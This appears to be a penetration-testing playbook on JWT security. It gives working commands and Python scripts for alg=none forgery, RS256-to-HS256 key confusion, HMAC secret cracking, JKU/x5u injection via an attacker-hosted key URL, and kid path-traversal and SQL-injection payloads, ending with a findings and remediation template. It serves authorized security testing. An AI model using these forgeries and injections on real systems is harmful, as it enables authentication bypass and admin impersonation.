---
name: testing-jwt-token-security
description: Assessing JSON Web Token implementations for cryptographic weaknesses, algorithm confusion attacks, and authorization bypass vulnerabilities during security engagements.
domain: cybersecurity
subdomain: web-application-security
tags: [penetration-testing, jwt, authentication, web-security, token-security, burpsuite]
version: "1.0"
author: mahipal
license: Apache-2.0
---

# Testing JWT Token Security

## When to Use

- During authorized penetration tests when the application uses JWT for authentication or authorization
- When assessing API security where JWTs are passed as Bearer tokens or in cookies
- For evaluating SSO implementations that use JWT/JWS/JWE tokens
- When testing OAuth 2.0 or OpenID Connect flows that issue JWTs
- During security audits of microservice architectures using JWT for inter-service authentication

## Prerequisites

- **Authorization**: Written penetration testing agreement for the target
- **jwt_tool**: JWT attack toolkit (`pip install jwt_tool` or `git clone https://github.com/ticarpi/jwt_tool.git`)
- **Burp Suite Professional**: With JSON Web Token extension from BApp Store
- **Python PyJWT**: For scripting custom JWT attacks (`pip install pyjwt`)
- **Hashcat**: For brute-forcing HMAC secrets (`apt install hashcat`)
- **jq**: For JSON processing
- **Target JWT**: A valid JWT token from the application

## Workflow

### Step 1: Decode and Analyze the JWT Structure

Extract and examine the header, payload, and signature components.

```bash
# Decode JWT parts (base64url decode)
JWT="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

# Decode header
echo "$JWT" | cut -d. -f1 | base64 -d 2>/dev/null | jq .
# Output: {"alg":"HS256","typ":"JWT"}

# Decode payload
echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null | jq .
# Output: {"sub":"1234567890","name":"John Doe","iat":1516239022}

# Using jwt_tool for comprehensive analysis
python3 jwt_tool.py "$JWT"

# Check for sensitive data in the payload:
# - PII (email, phone, address)
# - Internal IDs or database references
# - Role/permission claims
# - Expiration times (exp, nbf, iat)
# - Issuer (iss) and audience (aud)
```

### Step 2: Test Algorithm None Attack

Attempt to forge tokens by setting the algorithm to "none".

```bash
# jwt_tool algorithm none attack
python3 jwt_tool.py "$JWT" -X a

# Manual none algorithm attack
# Create header: {"alg":"none","typ":"JWT"}
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')

# Create modified payload (change role to admin)
PAYLOAD=$(echo -n '{"sub":"1234567890","name":"John Doe","role":"admin","iat":1516239022}' | base64 | tr -d '=' | tr '+/' '-_')

# Construct token with empty signature
FORGED_JWT="${HEADER}.${PAYLOAD}."
echo "Forged JWT: $FORGED_JWT"

# Test the forged token
curl -s -H "Authorization: Bearer $FORGED_JWT" \
  "https://target.example.com/api/admin/users" | jq .

# Try variations: "None", "NONE", "nOnE"
for alg in none None NONE nOnE; do
  HEADER=$(echo -n "{\"alg\":\"$alg\",\"typ\":\"JWT\"}" | base64 | tr -d '=' | tr '+/' '-_')
  FORGED="${HEADER}.${PAYLOAD}."
  echo -n "alg=$alg: "
  curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $FORGED" \
    "https://target.example.com/api/admin/users"
  echo
done
```

### Step 3: Test Algorithm Confusion (RS256 to HS256)

If the server uses RS256, try switching to HS256 and signing with the public key.

```bash
# Step 1: Obtain the server's public key
# Check common locations
curl -s "https://target.example.com/.well-known/jwks.json" | jq .
curl -s "https://target.example.com/.well-known/openid-configuration" | jq .jwks_uri
curl -s "https://target.example.com/oauth/certs" | jq .

# Step 2: Extract public key from JWKS
# Save the JWKS and convert to PEM format
# Use jwt_tool or openssl

# Step 3: jwt_tool key confusion attack
python3 jwt_tool.py "$JWT" -X k -pk public_key.pem

# Manual algorithm confusion attack with Python
python3 << 'PYEOF'
import jwt
import json

# Read the server's RSA public key
with open('public_key.pem', 'r') as f:
    public_key = f.read()

# Create forged payload
payload = {
    "sub": "1234567890",
    "name": "Admin User",
    "role": "admin",
    "iat": 1516239022,
    "exp": 9999999999
}

# Sign with HS256 using the RSA public key as the HMAC secret
forged_token = jwt.encode(payload, public_key, algorithm='HS256')
print(f"Forged token: {forged_token}")
PYEOF

# Test the forged token
curl -s -H "Authorization: Bearer $FORGED_TOKEN" \
  "https://target.example.com/api/admin/users"
```

### Step 4: Brute-Force HMAC Secret

If HS256 is used, attempt to crack the signing secret.

```bash
# Using jwt_tool with common secrets
python3 jwt_tool.py "$JWT" -C -d /usr/share/wordlists/rockyou.txt

# Using hashcat for GPU-accelerated cracking
# Mode 16500 = JWT (HS256)
hashcat -a 0 -m 16500 "$JWT" /usr/share/wordlists/rockyou.txt

# Using john the ripper
echo "$JWT" > jwt_hash.txt
john jwt_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

# If secret is found, forge arbitrary tokens
python3 << 'PYEOF'
import jwt

secret = "cracked_secret_here"
payload = {
    "sub": "1",
    "name": "Admin",
    "role": "admin",
    "exp": 9999999999
}
token = jwt.encode(payload, secret, algorithm='HS256')
print(f"Forged token: {token}")
PYEOF
```

### Step 5: Test JWT Claim Manipulation and Injection

Modify JWT claims to escalate privileges or bypass authorization.

```bash
# Using jwt_tool for claim tampering
# Change role claim
python3 jwt_tool.py "$JWT" -T -S hs256 -p "known_secret" \
  -pc role -pv admin

# Test common claim attacks:

# 1. JKU (JWK Set URL) injection
python3 jwt_tool.py "$JWT" -X s -ju "https://attacker.example.com/jwks.json"
# Host attacker-controlled JWKS at the URL

# 2. KID (Key ID) injection
# SQL injection in kid parameter
python3 jwt_tool.py "$JWT" -I -hc kid -hv "../../dev/null" -S hs256 -p ""
# If kid is used in file path lookup, point to /dev/null (empty key)

# SQL injection via kid
python3 jwt_tool.py "$JWT" -I -hc kid -hv "' UNION SELECT 'secret' --" -S hs256 -p "secret"

# 3. x5u (X.509 URL) injection
python3 jwt_tool.py "$JWT" -X s -x5u "https://attacker.example.com/cert.pem"

# 4. Modify subject and role claims
python3 jwt_tool.py "$JWT" -T -S hs256 -p "secret" \
  -pc sub -pv "admin@target.com" \
  -pc role -pv "superadmin"
```

### Step 6: Test Token Lifetime and Revocation

Assess token expiration enforcement and revocation capabilities.

```bash
# Test expired token acceptance
python3 << 'PYEOF'
import jwt
import time

secret = "known_secret"
# Create token that expired 1 hour ago
payload = {
    "sub": "user123",
    "role": "user",
    "exp": int(time.time()) - 3600,
    "iat": int(time.time()) - 7200
}
expired_token = jwt.encode(payload, secret, algorithm='HS256')
print(f"Expired token: {expired_token}")
PYEOF

curl -s -H "Authorization: Bearer $EXPIRED_TOKEN" \
  "https://target.example.com/api/profile" -w "%{http_code}"

# Test token with far-future expiration
python3 << 'PYEOF'
import jwt

secret = "known_secret"
payload = {
    "sub": "user123",
    "role": "user",
    "exp": 32503680000  # Year 3000
}
long_lived = jwt.encode(payload, secret, algorithm='HS256')
print(f"Long-lived token: {long_lived}")
PYEOF

# Test token reuse after logout
# 1. Capture JWT before logout
# 2. Log out (call /auth/logout)
# 3. Try using the captured JWT again
curl -s -H "Authorization: Bearer $PRE_LOGOUT_TOKEN" \
  "https://target.example.com/api/profile" -w "%{http_code}"
# If 200, tokens are not revoked on logout

# Test token reuse after password change
# Similar test: capture JWT, change password, reuse old JWT
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| **Algorithm None Attack** | Removing signature verification by setting `alg` to `none` |
| **Algorithm Confusion** | Switching from RS256 to HS256 and signing with the public key as HMAC secret |
| **HMAC Brute Force** | Cracking weak HS256 signing secrets using wordlists or brute force |
| **JKU/x5u Injection** | Pointing JWT header URLs to attacker-controlled key servers |
| **KID Injection** | Exploiting SQL injection or path traversal in the Key ID header parameter |
| **Claim Tampering** | Modifying payload claims (role, sub, permissions) after compromising the signing key |
| **Token Revocation** | The ability (or inability) to invalidate tokens before their expiration |
| **JWE vs JWS** | JSON Web Encryption (confidentiality) vs JSON Web Signature (integrity) |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **jwt_tool** | Comprehensive JWT testing toolkit with automated attack modules |
| **Burp JWT Editor** | Burp Suite extension for real-time JWT manipulation |
| **Hashcat** | GPU-accelerated HMAC secret brute-forcing (mode 16500) |
| **John the Ripper** | CPU-based JWT secret cracking |
| **PyJWT** | Python library for programmatic JWT creation and manipulation |
| **jwt.io** | Online JWT decoder for quick analysis (do not paste production tokens) |

## Common Scenarios

### Scenario 1: Algorithm None Bypass
The JWT library accepts `"alg":"none"` tokens, allowing any user to forge admin tokens by simply removing the signature and changing the algorithm header.

### Scenario 2: Weak HMAC Secret
The application uses HS256 with a dictionary word as the signing secret. Hashcat cracks the secret in minutes, enabling complete token forgery and admin impersonation.

### Scenario 3: Algorithm Confusion on SSO
An SSO provider uses RS256 but the consumer application also accepts HS256. The attacker signs a forged token with the publicly available RSA public key using HS256.

### Scenario 4: KID SQL Injection
The `kid` header parameter is used in a SQL query to look up signing keys. Injecting `' UNION SELECT 'attacker_secret' --` allows the attacker to control the signing key.

## Output Format

```
## JWT Security Finding

**Vulnerability**: JWT Algorithm Confusion (RS256 to HS256)
**Severity**: Critical (CVSS 9.8)
**Location**: Authorization header across all API endpoints
**OWASP Category**: A02:2021 - Cryptographic Failures

### JWT Configuration
| Property | Value |
|----------|-------|
| Algorithm | RS256 (also accepts HS256) |
| Issuer | auth.target.example.com |
| Expiration | 24 hours |
| Public Key | Available at /.well-known/jwks.json |
| Revocation | Not implemented |

### Attacks Confirmed
| Attack | Result |
|--------|--------|
| Algorithm None | Blocked |
| Algorithm Confusion (RS256→HS256) | VULNERABLE |
| HMAC Brute Force | N/A (RSA) |
| KID Injection | Not present |
| Expired Token Reuse | Accepted (no revocation) |

### Impact
- Complete authentication bypass via forged admin tokens
- Any user can escalate to any role by forging JWT claims
- Tokens remain valid after logout (no server-side revocation)

### Recommendation
1. Enforce algorithm allowlisting on the server side (reject unexpected algorithms)
2. Use asymmetric algorithms (RS256/ES256) with proper key management
3. Implement token revocation via a blocklist or short expiration with refresh tokens
4. Validate all JWT claims server-side (iss, aud, exp, nbf)
5. Use a minimum key length of 256 bits for HMAC secrets
```
